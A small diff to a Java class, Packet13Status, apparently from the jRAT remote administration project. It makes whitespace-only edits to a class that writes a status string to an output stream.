@@ -4,15 +4,14 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet13Status extends AbstractOutgoingPacket {
 
 	private String status;
-	
+
 	public Packet13Status(String status) {
 		this.status = status;
 	}
-	
+
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
 		sw.writeLine(status);
